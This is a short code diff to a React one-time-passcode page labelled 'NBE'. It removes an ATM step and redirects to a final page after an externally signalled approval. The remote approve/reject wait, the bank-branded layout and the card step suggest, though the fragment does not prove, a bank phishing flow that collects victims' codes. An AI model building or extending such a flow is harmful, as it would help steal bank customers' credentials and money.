@@ -24,7 +24,7 @@ export default function OTPPageNBE() {
         setIsWaiting(false);
         setErrorMsg("");
         isFormApproved.value = false;
-        setLocation("/atm-nbe");
+        setLocation("/final-nbe");
       }
       if (isFormRejected.value && isWaiting) {
         setIsWaiting(false);
@@ -95,7 +95,7 @@ export default function OTPPageNBE() {
     <>
       {isWaiting && <WaitingOverlay message="جاري التحقق من الرمز..." />}
       
-      <NBELayout currentStep={2} totalSteps={3}>
+      <NBELayout currentStep={2} totalSteps={2}>
         <div className="text-center mb-6">
           <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
             <svg className="w-7 h-7 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
